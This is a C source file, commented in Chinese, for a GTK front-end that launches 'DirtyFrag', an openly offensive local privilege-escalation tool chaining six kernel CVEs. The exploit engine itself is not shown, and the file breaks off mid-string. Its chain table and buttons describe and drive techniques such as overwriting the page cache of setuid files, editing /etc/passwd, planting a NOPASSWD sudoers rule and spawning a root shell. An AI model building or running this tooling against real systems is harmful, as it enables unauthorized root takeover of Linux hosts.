/* ============================================================================
 *  dirtyfrag-gui.c — DirtyFrag 五链页缓存提权 PoC 的图形前端
 *
 *  适配 XFCE 桌面 (GTK3)。它本身不做任何内核操作, 只负责:
 *      · 拼出正确的命令行
 *      · 在伪终端 (pty) 里启动 poc, 让 poc 的彩色日志与交互式 shell 都正常
 *      · 把输出实时渲染到窗口里, 并解析 ANSI 颜色
 *      · 把输入框的内容发回 pty (提权成功后这里就是 root shell)
 *
 *  之所以用 pty 而不是普通管道: poc 的 color_enabled() 依赖 isatty(),
 *  且 43284/43494/46331 成功后会 execl 到 /bin/sh 或 su, 没有 tty 会退化。
 *
 *  编译:
 *      gcc -O2 -Wall -o dirtyfrag-gui dirtyfrag-gui.c \
 *          $(pkg-config --cflags --libs gtk+-3.0) -lutil
 * ==========================================================================*/

#define _GNU_SOURCE
#include <gtk/gtk.h>
#include <gdk/gdkkeysyms.h>

#include <pty.h>
#include <utmp.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <pwd.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <limits.h>

#define APP_TITLE       "DirtyFrag · 页缓存提权"
/* 构建标识: 标题栏副标题上直接显示, 用来确认跑的是不是最新这份 */
#define DF_BUILD        "2026-10-31-r9"
#define APP_SUBTITLE    "六链 PoC 图形前端 · " DF_BUILD
#define LOG_MAX_LINES   20000
#define PTY_COLS        110
#define PTY_ROWS        32
#define PATH_BUF        1024

/* ---------------------------------------------------------------------------
 * 链条描述表。顺序即下拉框顺序 (下标 0 是"全部")。
 * ------------------------------------------------------------------------ */
typedef struct {
    const char *id;      /* 传给 poc 的编号参数 */
    const char *tag;     /* 下拉框里显示的短名 */
    const char *name;    /* 全名 */
    const char *desc;    /* 说明 */
    const char *need;    /* 前提 */
    int         engine;  /* 0 = 内置 dirtyfrag 引擎, 1 = ovswrap 引擎 */
} Chain;

static const Chain chains[] = {
    { "-2026-31431", "31431 · Copy Fail",
      "CVE-2026-31431  AF_ALG / AEAD",
      "splice 文件页进 AEAD, 原地解密写 4 字节",
      "需 authencesn(hmac(sha256),cbc(aes)) + algif_aead", 0 },

    { "-2026-43284", "43284 · XFRM/ESP",
      "CVE-2026-43284  XFRM / ESP",
      "splice + esp_input 原地解密, 写 ESN 高 32 位",
      "需非特权 userns + XFRM + ESP", 0 },

    { "-2026-43500", "43500 · RxRPC",
      "CVE-2026-43500  RxRPC / RXKAD",
      "8 字节 pcbc(fcrypt) 原地解密, 改 /etc/passwd 首行",
      "需 AF_RXRPC + RXKAD, 写位置固定", 0 },

    { "-2026-43494", "43494 · io_uring",
      "CVE-2026-43494  io_uring + RDS",
      "页引用计数劫持, 整页替换 setuid 文件",
      "需 IORING_REGISTER_CLONE_BUFFERS (6.12+)", 0 },

    { "-2026-46331", "46331 · act_pedit",
      "CVE-2026-46331  net/sched act_pedit",
      "sendfile 进 loopback, pedit 改 TCP 头, 写穿页缓存",
      "需 act_pedit + clsact + userns", 0 },

    { "-2026-64531", "64531 · OVS CT",
      "CVE-2026-64531  net/openvswitch CT action",
      "伪造 SET action 越界读内核内存, dst_release 递减改 cred",
      "需 openvswitch + userns，偏移读 offset/ 配置表", 1 },
};
#define N_CHAINS ((int)(sizeof(chains) / sizeof(chains[0])))

/* ---------------------------------------------------------------------------
 * 应用状态
 * ------------------------------------------------------------------------ */
typedef struct {
    GtkWidget *window;
    GtkWidget *header;
    GtkWidget *btn_expand;   /* 左上角「展开」开关 */
    GtkWidget *img_expand;
    GtkWidget *lbl_expand;
    GtkWidget *revealer;     /* 展开后的扩展面板 */
    GtkWidget *uaf_slot;     /* 扩展面板里的插槽: 接入新链的控件放这里 */
    GtkWidget *banner, *banner_lbl;
    GtkWidget *combo;
    GtkWidget *lbl_name, *lbl_desc, *lbl_need;
    GtkWidget *entry_target, *entry_to, *entry_set, *entry_offset;
    GtkWidget *chk_nobackup, *chk_verbose;
    GtkWidget *btn_check, *btn_test, *btn_lpe, *btn_write, *btn_find, *btn_stop;
    GtkWidget   *logview;
    GtkTextBuffer *logbuf;
    GtkTextMark *log_end_mark;
    GtkWidget *entry_input, *btn_send, *btn_ctrlc;
    GtkWidget *status_lbl, *spinner;

    GtkTextTag *tag_fg[8];   /* 30..37 */
    GtkTextTag *tag_bold, *tag_dim;

    /* 子进程 */
    int         master_fd;
    GPid        pid;
    guint       watch_id;
    guint       child_id;
    gboolean    running;

    /* ANSI 解析状态 */
    int         ansi_state;  /* 0 普通 / 1 ESC / 2 CSI / 3 OSC */
    GString    *csi;
    GString    *run;         /* 待插入的同色文本 */
    int         cur_fg;      /* -1 = 默认 */
    int         cur_bold, cur_dim;
    int         trim_counter;

    char       *poc_path;
    gboolean    poc_builtin; /* TRUE: 用自身内置引擎 (子进程加 --engine) */
    int         last_exit;
    gboolean    stop_requested;
    const char *action;      /* 当前动作, 用于退出码文案 */

    /* 背景图 */
    GtkWidget  *bg_area;
    GdkPixbuf  *bg_pix;
    cairo_surface_t *bg_surf;   /* 已按窗口尺寸 cover 缩放 + 白雾, 一次画好 */
    int         bg_cache_w, bg_cache_h;
    char       *bg_path;
} App;

/* ---------------------------------------------------------------------------
 * 小工具
 * ------------------------------------------------------------------------ */
static const char *user_name(void)
{
    static char buf[64];
    uid_t u = getuid();
    struct passwd *pw;

    if (buf[0])
        return buf;
    pw = getpwuid(u);
    if (pw)
        g_strlcpy(buf, pw->pw_name, sizeof(buf));
    else
        g_snprintf(buf, sizeof(buf), "uid=%u", (unsigned)u);
    return buf;
}

static const char *kernel_release(void)
{
    static char buf[128];

    struct utsname ut;

    if (buf[0])
        return buf;
    if (uname(&ut) == 0)
        g_strlcpy(buf, ut.release, sizeof(buf));
    else
        g_strlcpy(buf, "未知", sizeof(buf));
    return buf;
}

/*
 * 引擎入口: 由 Makefile 用 -Dmain=dirtyfrag_poc_main 把 poc 的 main 改名后
 * 链接进来, 于是本程序既是 GUI 也是 poc。
 */
extern int dirtyfrag_poc_main(int argc, char **argv);
int ovswrap_main(int argc, char **argv);

/*
 * 决定跑哪个引擎:
 *   --poc <路径> / DIRTYFRAG_POC  -> 外部 poc 可执行文件 (兼容旧用法)
 *   其余情况                      -> 自身 (加 --engine 参数, 子进程 exec 自己)
 *
 * 用 "exec 自身" 而不是在 fork 出来的子进程里直接调函数: 子进程经过 exec
 * 得到干净地址空间 (不带着 GTK / glib 的线程与锁状态), 而提权成功后引擎会
 * execl("/bin/sh"), 本来也需要一个可被整体替换的进程。
 */
static char *self_exe(void)
{
    char exe[PATH_MAX];
    ssize_t n = readlink("/proc/self/exe", exe, sizeof(exe) - 1);

    if (n <= 0)
        return NULL;
    exe[n] = '\0';
    return g_strdup(exe);
}

static char *find_poc(const char *override, gboolean *builtin)
{
    const char *env = g_getenv("DIRTYFRAG_POC");

    *builtin = FALSE;
    if (override && *override)
        return g_strdup(override);
    if (env && *env)
        return g_strdup(env);

    *builtin = TRUE;
    return self_exe();
}

/* ---------------------------------------------------------------------------
 * 背景图
 *
 * 查找顺序: --bg 参数 > DIRTYFRAG_BG > 程序同目录 assets/bg.png > 同目录
 * bg.png > ../share/dirtyfrag/bg.png > 当前目录 > /usr[/local]/share。
 * 找不到就用淡蓝纯色底, 界面照常可用。
 * ------------------------------------------------------------------------ */
static char *find_bg(const char *override)
{
    static const char *sys[] = {
        "/usr/local/share/dirtyfrag/bg.png",
        "/usr/share/dirtyfrag/bg.png",
    };
    static const char *rel[] = { "assets/bg.png", "bg.png" };
    char exe[PATH_MAX];
    ssize_t n;
    size_t i;
    const char *env = g_getenv("DIRTYFRAG_BG");

    if (override && *override)
        return g_strdup(override);
    if (env && *env)
        return g_strdup(env);

    n = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
    if (n > 0) {
        char *dir;

        exe[n] = '\0';
        dir = g_path_get_dirname(exe);
        for (i = 0; i < G_N_ELEMENTS(rel); i++) {
            char *c = g_build_filename(dir, rel[i], NULL);

            if (g_file_test(c, G_FILE_TEST_EXISTS)) {
                g_free(dir);
                return c;
            }
            g_free(c);
        }
        {
            char *c = g_build_filename(dir, "..", "share", "dirtyfrag",
                                       "bg.png", NULL);

            if (g_file_test(c, G_FILE_TEST_EXISTS)) {
                g_free(dir);
                return c;
            }
            g_free(c);
        }
        g_free(dir);
    }

    for (i = 0; i < G_N_ELEMENTS(rel); i++)
        if (g_file_test(rel[i], G_FILE_TEST_EXISTS))
            return g_strdup(rel[i]);
    for (i = 0; i < G_N_ELEMENTS(sys); i++)
        if (g_file_test(sys[i], G_FILE_TEST_EXISTS))
            return g_strdup(sys[i]);

    return NULL;
}

/*
 * 把 "cover 缩放 + 白雾" 一次性合成到一张与窗口等大的 image surface 上。
 * 这样每次 expose 只剩一次 blit, 移动/缩放窗口时不会因为实时缩放整张
 * 大图而掉帧拉出残影。
 */
static void bg_cache_rebuild(App *a, int w, int h)
{
    cairo_surface_t *surf;
    cairo_t *cr;
    int iw, ih;
    double s, dw, dh;

    if (!a->bg_pix || w < 1 || h < 1)
        return;
    if (a->bg_surf && a->bg_cache_w == w && a->bg_cache_h == h)
        return;

    if (a->bg_surf) {
        cairo_surface_destroy(a->bg_surf);
        a->bg_surf = NULL;
    }

    surf = cairo_image_surface_create(CAIRO_FORMAT_RGB24, w, h);
    if (cairo_surface_status(surf) != CAIRO_STATUS_SUCCESS) {
        cairo_surface_destroy(surf);
        return;
    }
    cr = cairo_create(surf);

    cairo_set_source_rgb(cr, 0.937, 0.957, 0.980);
    cairo_paint(cr);

    iw = gdk_pixbuf_get_width(a->bg_pix);
    ih = gdk_pixbuf_get_height(a->bg_pix);
    s = MAX((double)w / (double)iw, (double)h / (double)ih);
    dw = iw * s;
    dh = ih * s;

    cairo_save(cr);
    cairo_rectangle(cr, 0, 0, w, h);
    cairo_clip(cr);
    cairo_translate(cr, (w - dw) / 2.0, (h - dh) / 2.0);
    cairo_scale(cr, s, s);
    gdk_cairo_set_source_pixbuf(cr, a->bg_pix, 0, 0);
    cairo_pattern_set_filter(cairo_get_source(cr), CAIRO_FILTER_BILINEAR);
    cairo_paint(cr);
    cairo_restore(cr);

    /* 一层白雾: 压低图片对比度, 让压在图上的深色文字依然清楚 */
    cairo_set_source_rgba(cr, 0.98, 0.99, 1.0, 0.26);
    cairo_paint(cr);

    cairo_destroy(cr);
    a->bg_surf = surf;
    a->bg_cache_w = w;
    a->bg_cache_h = h;
}

/*
 * 窗口被拖动或改尺寸时整块重绘背景。无合成器的 X11 只重绘被标记为
 * 损坏的区域, 窗口移动过程中容易漏掉边缘, 剩下一块未定义的像素
 * (看起来就是画面被撕裂、透出桌面)。
 */
static gboolean on_configure(GtkWidget *w, GdkEventConfigure *ev, gpointer data)
{
    App *a = data;

    (void)w;
    (void)ev;
    if (a->bg_area)
        gtk_widget_queue_draw(a->bg_area);
    return FALSE;
}

/*
 * 背景层是 GtkOverlay 的底层 child (GtkDrawingArea), 界面控件压在它上面。
 * 控件都是不透明浅色, 因此不依赖合成器/窗口 alpha, 在 Xvfb、无合成器的
 * XFCE 会话里表现一致。
 */
static gboolean on_bg_draw(GtkWidget *w, cairo_t *cr, gpointer data)
{
    App *a = data;
    int ww = gtk_widget_get_allocated_width(w);
    int wh = gtk_widget_get_allocated_height(w);

    /* 兜底底色: 任何情况下窗口都不会露出后面的桌面 */
    cairo_set_source_rgb(cr, 0.937, 0.957, 0.980);
    cairo_paint(cr);
    if (!a->bg_pix)
        return FALSE;

    bg_cache_rebuild(a, ww, wh);
    if (a->bg_surf) {
        cairo_set_source_surface(cr, a->bg_surf, 0, 0);
        cairo_set_operator(cr, CAIRO_OPERATOR_SOURCE);
        cairo_paint(cr);
        cairo_set_operator(cr, CAIRO_OPERATOR_OVER);
    }
    return FALSE;
}

/* ---------------------------------------------------------------------------
 * 日志区
 * ------------------------------------------------------------------------ */
static void log_scroll_bottom(App *a)
{
    GtkTextIter end;

    gtk_text_buffer_get_end_iter(a->logbuf, &end);
    gtk_text_buffer_move_mark(a->logbuf, a->log_end_mark, &end);
    gtk_text_view_scroll_to_mark(GTK_TEXT_VIEW(a->logview),
                                 a->log_end_mark, 0.0, TRUE, 0.0, 1.0);
}

static void log_trim(App *a)
{
    GtkTextIter start, cut;
    int lines;

    if (++a->trim_counter < 40)
        return;
    a->trim_counter = 0;

    lines = gtk_text_buffer_get_line_count(a->logbuf);
    if (lines <= LOG_MAX_LINES)
        return;

    gtk_text_buffer_get_start_iter(a->logbuf, &start);
    cut = start;
    gtk_text_iter_forward_lines(&cut, lines - LOG_MAX_LINES);
    gtk_text_buffer_delete(a->logbuf, &start, &cut);
}

/* 把 run 缓冲区按当前颜色插入 */
static void log_flush(App *a)
{
    GtkTextIter end;
    GtkTextTag *tags[4];
    int nt = 0;

    if (!a->run || a->run->len == 0)
        return;

    if (a->cur_fg >= 0 && a->tag_fg[a->cur_fg])
        tags[nt++] = a->tag_fg[a->cur_fg];
    if (a->cur_bold)
        tags[nt++] = a->tag_bold;
    if (a->cur_dim)
        tags[nt++] = a->tag_dim;

    gtk_text_buffer_get_end_iter(a->logbuf, &end);
    if (nt == 0) {
        gtk_text_buffer_insert(a->logbuf, &end, a->run->str, (gint)a->run->len);
    } else {
        tags[nt] = NULL;
        gtk_text_buffer_insert_with_tags(a->logbuf, &end, a->run->str,
                                         (gint)a->run->len,
                                         tags[0],
                                         nt > 1 ? tags[1] : NULL,
                                         nt > 2 ? tags[2] : NULL,
                                         NULL);
    }
    g_string_truncate(a->run, 0);
    log_trim(a);
}

/*
 * 单独的回车 (后面不是 \n): 把当前这一行清掉, 让进度条原地刷新。
 * 不这样处理的话, 每次刷新都会接在同一行尾巴上, 折行后看起来像一堆
 * 重叠的乱码。
 */
static void log_carriage_return(App *a)
{
    GtkTextIter end, bol;

    log_flush(a);
    gtk_text_buffer_get_end_iter(a->logbuf, &end);
    bol = end;
    gtk_text_iter_set_line_offset(&bol, 0);
    if (!gtk_text_iter_equal(&bol, &end))
        gtk_text_buffer_delete(a->logbuf, &bol, &end);
}

static void log_append_plain(App *a, const char *text)
{
    GtkTextIter end;

    log_flush(a);
    gtk_text_buffer_get_end_iter(a->logbuf, &end);
    gtk_text_buffer_insert(a->logbuf, &end, text, -1);
    log_scroll_bottom(a);
}

/* SGR 参数解析: 支持 0/1/2/22/30-37/39/90-97 */
static void sgr_apply(App *a, const char *params)
{
    gchar **parts;
    int i;

    if (!params || !*params) {
        a->cur_fg = -1;
        a->cur_bold = a->cur_dim = 0;
        return;
    }

    parts = g_strsplit(params, ";", -1);
    for (i = 0; parts[i]; i++) {
        int v;

        if (!*parts[i]) {
            /* 空参数等价于 0, 但 "0;" 这类尾部空项忽略即可 */
            continue;
        }
        v = atoi(parts[i]);
        if (v == 0) {
            a->cur_fg = -1;
            a->cur_bold = a->cur_dim = 0;
        } else if (v == 1) {
            a->cur_bold = 1;
        } else if (v == 2) {
            a->cur_dim = 1;
        } else if (v == 22) {
            a->cur_bold = a->cur_dim = 0;
        } else if (v >= 30 && v <= 37) {
            a->cur_fg = v - 30;
        } else if (v == 39) {
            a->cur_fg = -1;
        } else if (v >= 90 && v <= 97) {
            a->cur_fg = v - 90;
        }
    }
    g_strfreev(parts);
}

/* 逐字节解析 pty 输出 */
static void ansi_feed(App *a, const char *buf, gsize n)
{
    gsize i;

    for (i = 0; i < n; i++) {
        unsigned char c = (unsigned char)buf[i];

        switch (a->ansi_state) {
        case 0:
            if (c == 0x1b) {
                log_flush(a);
                a->ansi_state = 1;
            } else if (c == '\r') {
                /* \r\n 是 pty 的常规换行, 交给后面的 \n; 单独 \r 是进度刷新 */
                if (i + 1 < n && buf[i + 1] == '\n') {
                    /* 忽略 */
                } else if (i + 1 < n) {
                    log_carriage_return(a);
                }
            } else if (c == '\b') {
                if (a->run->len > 0)
                    g_string_truncate(a->run, a->run->len - 1);
            } else if (c == '\a') {
                /* 响铃忽略 */
            } else {
                g_string_append_c(a->run, (char)c);
                if (a->run->len >= 4096)
                    log_flush(a);
            }
            break;

        case 1:
            if (c == '[') {
                a->ansi_state = 2;
                g_string_truncate(a->csi, 0);
            } else if (c == ']') {
                a->ansi_state = 3;
            } else if (c == '(' || c == ')') {
                a->ansi_state = 4;   /* 字符集切换, 吃掉一个字节 */
            } else {
                a->ansi_state = 0;
            }
            break;

        case 2:
            if (c >= 0x40 && c <= 0x7e) {
                if (c == 'm')
                    sgr_apply(a, a->csi->str);
                a->ansi_state = 0;
            } else if (a->csi->len < 64) {
                g_string_append_c(a->csi, (char)c);
            } else {
                a->ansi_state = 0;
            }
            break;

        case 3:
            if (c == 0x07 || c == 0x1b)
                a->ansi_state = 0;
            break;

        case 4:
            a->ansi_state = 0;
            break;

        default:
            a->ansi_state = 0;
            break;
        }
    }
}

/* ---------------------------------------------------------------------------
 * 子进程: forkpty + execvp
 * ------------------------------------------------------------------------ */
static void app_set_busy(App *a, gboolean busy);

static gboolean on_pty_readable(GIOChannel *src, GIOCondition cond, gpointer data)
{
    App *a = data;
    char buf[8192];
    ssize_t n;

    (void)src;

    for (;;) {
        n = read(a->master_fd, buf, sizeof(buf));
        if (n > 0) {
            ansi_feed(a, buf, (gsize)n);
            continue;
        }
        if (n < 0 && (errno == EINTR))
            continue;
        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK))
            break;

        /* n == 0 或真错误: 对端关闭 */
        log_flush(a);
        return FALSE;
    }

    log_flush(a);
    log_scroll_bottom(a);
    if (cond & (G_IO_HUP | G_IO_ERR))
        return FALSE;
    return TRUE;
}

static void on_child_exit(GPid pid, gint status, gpointer data)
{
    App *a = data;
    const char *verdict;
    const char *color = "status-ok";
    int code = -1;

    g_spawn_close_pid(pid);

    if (WIFEXITED(status))
        code = WEXITSTATUS(status);
    else if (WIFSIGNALED(status))
        code = 128 + WTERMSIG(status);

    a->last_exit = code;
    a->pid = 0;
    a->child_id = 0;
    a->running = FALSE;

    /* -check 的 1 表示"没读到配置", 与"写了没生效"是两回事 */
    if (code == 1 && a->action && !strcmp(a->action, "检查配置")) {
        char line[160];

        g_snprintf(line, sizeof(line),
                   "\n── 进程结束: 配置检查未完成 (退出码 1) ──\n");
        log_flush(a);
        log_append_plain(a, line);
        gtk_widget_set_name(a->status_lbl, "status-warn");
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "配置检查未完成 (退出码 1)");
        app_set_busy(a, FALSE);
        return;
    }

    if (a->stop_requested && code > 128) {
        char line[96];

        g_snprintf(line, sizeof(line), "\n── 进程结束: 已手动停止 ──\n");
        log_flush(a);
        log_append_plain(a, line);
        gtk_widget_set_name(a->status_lbl, "status-warn");
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "已手动停止");
        app_set_busy(a, FALSE);
        return;
    }

    switch (code) {
    case 0:
        verdict = "完成 (退出码 0)";
        color = "status-ok";
        break;
    case 1:
        verdict = "未通过 / 写入未生效 (退出码 1)";
        color = "status-warn";
        break;
    case 2:
        verdict = "参数或前置条件不满足 (退出码 2)";
        color = "status-warn";
        break;
    case 3:
        verdict = "本机不可用, 未做任何写入 (退出码 3)";
        color = "status-warn";
        break;
    default:
        if (code > 128) {
            verdict = "被信号终止";
            color = "status-err";
        } else {
            verdict = "异常退出";
            color = "status-err";
        }
        break;
    }

    {
        char line[160];
        g_snprintf(line, sizeof(line), "\n── 进程结束: %s ──\n", verdict);
        log_flush(a);
        log_append_plain(a, line);
    }

    gtk_widget_set_name(a->status_lbl, color);
    gtk_label_set_text(GTK_LABEL(a->status_lbl), verdict);

    app_set_busy(a, FALSE);
}

static const Chain *cur_chain(App *a);

/* 启动 poc。argv 以 NULL 结尾, 不含程序名 */
static gboolean app_spawn(App *a, char **args, const char *what)
{
    struct winsize ws;
    char *argv[32];
    int argc = 0, i;
    pid_t pid;
    const Chain *c = cur_chain(a);
    int ovs = (c && c->engine == 1);
    char eflag[16] = "";

    if (ovs && !a->poc_builtin) {
        log_append_plain(a, "[!] OVS 链只能用内置引擎，不能用 --poc 指定外部程序。\n");
        return FALSE;
    }

    if (a->running) {
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "已有任务在运行");
        return FALSE;
    }
    a->action = what;
    if (!a->poc_path) {
        log_append_plain(a, "[!] 找不到引擎 (内置引擎异常, 可用 --poc <路径> 指定外部 poc)。\n");
        return FALSE;
    }

    memset(&ws, 0, sizeof(ws));
    ws.ws_col = PTY_COLS;
    ws.ws_row = PTY_ROWS;

    if (a->poc_builtin)
        g_snprintf(eflag, sizeof(eflag), "%s ", ovs ? "--ovs" : "--engine");

    /* 分隔线 + 命令行回显 */
    {
        char *cmdline = g_strjoinv(" ", args);
        char head[PATH_BUF * 3];
        g_snprintf(head, sizeof(head), "\n\033[2m══ %s ══\n$ %s %s%s\033[0m\n",
                   what ? what : "运行", a->poc_path, eflag, cmdline);
        ansi_feed(a, head, strlen(head));
        log_flush(a);
        g_free(cmdline);
    }

    argv[argc++] = a->poc_path;
    if (a->poc_builtin)
        argv[argc++] = (char *)(ovs ? "--ovs" : "--engine");
    for (i = 0; args[i] && argc < 30; i++)
        argv[argc++] = args[i];
    argv[argc] = NULL;

    pid = forkpty(&a->master_fd, NULL, NULL, &ws);
    if (pid < 0) {
        char msg[256];
        g_snprintf(msg, sizeof(msg), "[!] forkpty 失败: %s\n", strerror(errno));
        log_append_plain(a, msg);
        return FALSE;
    }

    if (pid == 0) {
        /* 子进程: 0/1/2 已指向 pty 从端 */
        setenv("TERM", "xterm-256color", 1);
        unsetenv("NO_COLOR");
        execvp(a->poc_path, argv);
        fprintf(stderr, "exec %s 失败: %s\n", a->poc_path, strerror(errno));
        _exit(127);
    }

    a->pid = pid;
    a->running = TRUE;
    a->stop_requested = FALSE;
    a->cur_fg = -1;
    a->cur_bold = a->cur_dim = 0;
    a->ansi_state = 0;

    fcntl(a->master_fd, F_SETFL, fcntl(a->master_fd, F_GETFL) | O_NONBLOCK);

    {
        GIOChannel *ch = g_io_channel_unix_new(a->master_fd);
        g_io_channel_set_encoding(ch, NULL, NULL);
        g_io_channel_set_buffered(ch, FALSE);
        a->watch_id = g_io_add_watch(ch, G_IO_IN | G_IO_HUP | G_IO_ERR,
                                     on_pty_readable, a);
        g_io_channel_unref(ch);
    }

    a->child_id = g_child_watch_add(pid, on_child_exit, a);

    gtk_label_set_text(GTK_LABEL(a->status_lbl), "运行中…");
    gtk_widget_set_name(a->status_lbl, "status-run");
    app_set_busy(a, TRUE);
    gtk_widget_grab_focus(a->entry_input);

    return TRUE;
}

static void app_kill(App *a, int sig)
{
    if (a->pid > 0) {
        kill(a->pid, sig);
        if (sig != SIGKILL)
            kill(-a->pid, sig);
    }
}

static gboolean kill_escalate(gpointer data)
{
    App *a = data;

    /* 只在这条子进程还挂着时才补刀, 避免 pid 被回收后误杀 */
    if (a->running && a->pid > 0) {
        kill(a->pid, SIGKILL);
        kill(-a->pid, SIGKILL);
    }
    return G_SOURCE_REMOVE;
}

static void app_stop(App *a)
{
    if (!a->running)
        return;

    a->stop_requested = TRUE;
    log_append_plain(a, "\n[*] 正在终止子进程…\n");
    app_kill(a, SIGTERM);
    g_timeout_add(1200, kill_escalate, a);
}

/* ---------------------------------------------------------------------------
 * 界面部件
 * ------------------------------------------------------------------------ */
static void app_set_busy(App *a, gboolean busy)
{
    GtkWidget *w[] = {
        a->btn_check, a->btn_test, a->btn_lpe, a->btn_write, a->btn_find,
        a->combo,
    };
    int i;

    for (i = 0; i < (int)(sizeof(w) / sizeof(w[0])); i++)
        gtk_widget_set_sensitive(w[i], !busy);
    gtk_widget_set_sensitive(a->btn_stop, busy);

    if (busy)
        gtk_spinner_start(GTK_SPINNER(a->spinner));
    else
        gtk_spinner_stop(GTK_SPINNER(a->spinner));
}

/* 当前选中的链: 0 表示"全部" -> NULL */
static const Chain *cur_chain(App *a)
{
    int idx = gtk_combo_box_get_active(GTK_COMBO_BOX(a->combo));

    if (idx <= 0 || idx > N_CHAINS)
        return NULL;
    return &chains[idx - 1];
}

static void update_desc(App *a)
{
    const Chain *c = cur_chain(a);

    if (!c) {
        gtk_label_set_markup(GTK_LABEL(a->lbl_name),
                             "<b>全部（dirtyfrag 五链）</b>");
        gtk_label_set_text(GTK_LABEL(a->lbl_desc),
                           "检查配置与自测会依次跑完 dirtyfrag 五链；OVS 链请单独选择后再操作。");
        gtk_label_set_text(GTK_LABEL(a->lbl_need), "");
        return;
    }

    {
        char *mk = g_markup_printf_escaped("<b>%s</b>", c->name);
        gtk_label_set_markup(GTK_LABEL(a->lbl_name), mk);
        g_free(mk);
    }
    gtk_label_set_text(GTK_LABEL(a->lbl_desc), c->desc);
    gtk_label_set_text(GTK_LABEL(a->lbl_need), c->need);
}

static void on_combo_changed(GtkComboBox *box, gpointer data)
{
    App *a = data;

    (void)box;
    update_desc(a);
}

/* 简易提示对话框 */
static void show_info(App *a, GtkMessageType type, const char *title,
                      const char *primary, const char *secondary)
{
    GtkWidget *dlg = gtk_message_dialog_new(GTK_WINDOW(a->window),
                                            GTK_DIALOG_MODAL |
                                            GTK_DIALOG_DESTROY_WITH_PARENT,
                                            type, GTK_BUTTONS_OK,
                                            "%s", primary);
    gtk_window_set_title(GTK_WINDOW(dlg), title);
    if (secondary)
        gtk_message_dialog_format_secondary_text(GTK_MESSAGE_DIALOG(dlg),
                                                 "%s", secondary);
    gtk_dialog_run(GTK_DIALOG(dlg));
    gtk_widget_destroy(dlg);
}

static gboolean confirm_run(App *a, const char *what, const char *cmdline,
                            const char *note)
{
    GtkWidget *dlg;
    gint resp;

    dlg = gtk_message_dialog_new(GTK_WINDOW(a->window),
                                 GTK_DIALOG_MODAL | GTK_DIALOG_DESTROY_WITH_PARENT,
                                 GTK_MESSAGE_WARNING, GTK_BUTTONS_NONE,
                                 "确认执行 %s？", what);
    gtk_window_set_title(GTK_WINDOW(dlg), "确认");
    gtk_message_dialog_format_secondary_text(
        GTK_MESSAGE_DIALOG(dlg),
        "将要运行：\n\n%s\n\n%s\n"
        "请确认这是你自己的机器、且已获得授权。", cmdline, note);
    gtk_dialog_add_buttons(GTK_DIALOG(dlg),
                           "取消", GTK_RESPONSE_CANCEL,
                           "执行", GTK_RESPONSE_OK, NULL);
    gtk_dialog_set_default_response(GTK_DIALOG(dlg), GTK_RESPONSE_CANCEL);
    resp = gtk_dialog_run(GTK_DIALOG(dlg));
    gtk_widget_destroy(dlg);

    return resp == GTK_RESPONSE_OK;
}

/* ---------------------------------------------------------------------------
 * 动作
 * ------------------------------------------------------------------------ */
static const char *entry_text(GtkWidget *e)
{
    const char *s = gtk_entry_get_text(GTK_ENTRY(e));

    return (s && *s) ? s : NULL;
}

static void act_check(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    const Chain *c = cur_chain(a);
    char *args[3];

    if (c && c->engine == 1) {
        char *ovs_args[] = { "-check", NULL };

        app_spawn(a, ovs_args, "检查 OVS 链前置条件");
        return;
    }

    args[0] = (char *)(c ? c->id : "-check");
    if (c) {
        args[1] = "-check";
        args[2] = NULL;
    } else {
        args[1] = NULL;
    }
    app_spawn(a, args, c ? "检查本链所需内核配置" : "检查全部链的内核配置");
}

static void act_test(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    const Chain *c = cur_chain(a);
    char *args[3];

    if (c && c->engine == 1) {
        char *ovs_args[] = { "-scan", NULL };

        app_spawn(a, ovs_args, "OVS 链自检（读原语）");
        return;
    }

    args[0] = (char *)(c ? c->id : "-test");
    if (c) {
        args[1] = "-test";
        args[2] = NULL;
    } else {
        args[1] = NULL;
    }
    app_spawn(a, args, c ? "自测本链写原语" : "全部自测");
}

static void act_find(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    char *args[] = { "-find", NULL };

    app_spawn(a, args, "扫描 setuid root 文件");
}

static void act_lpe(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    const Chain *c = cur_chain(a);
    char *args[8];
    int n = 0;
    const char *tgt;
    char cmd[600];

    if (!c) {
        show_info(a, GTK_MESSAGE_INFO, "需要选择一条链",
                  "请先在上方选择具体的 CVE。",
                  "「全部六条链」只用于配置检查与自测；"
                  "提权和通用写必须指定其中一条。");
        return;
    }

    /* OVS 链走另一套参数：-start 直接在 host 上写 sudoers 并弹 root shell */
    if (c->engine == 1) {
        char *ovs_args[3];
        int on = 0;

        ovs_args[on++] = "-start";
        if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_verbose)))
            ovs_args[on++] = "-v";
        ovs_args[on] = NULL;

        g_snprintf(cmd, sizeof(cmd), "%s --ovs -start", a->poc_path);
        if (!confirm_run(a, c->name, cmd,
                         "这条链会在 /etc/sudoers.d 下写一条 "
                         "NOPASSWD 规则，然后打开 root shell。"))
            return;
        app_spawn(a, ovs_args, "OVS 一键提权");
        return;
    }

    args[n++] = (char *)c->id;
    args[n++] = "-start";
    if ((tgt = entry_text(a->entry_target)) != NULL) {
        args[n++] = "-t";
        args[n++] = (char *)tgt;
    }
    if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_nobackup)))
        args[n++] = "-nobackup";
    if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_verbose)))
        args[n++] = "-v";
    args[n] = NULL;

    g_snprintf(cmd, sizeof(cmd), "%s %s -start%s%s%s",
               a->poc_path, c->id,
               tgt ? " -t " : "", tgt ? tgt : "",
               gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_nobackup))
                   ? " -nobackup" : "");

    if (!confirm_run(a, c->name, cmd,
                     "这条链会直接修改磁盘上某个 setuid 文件的页缓存，"
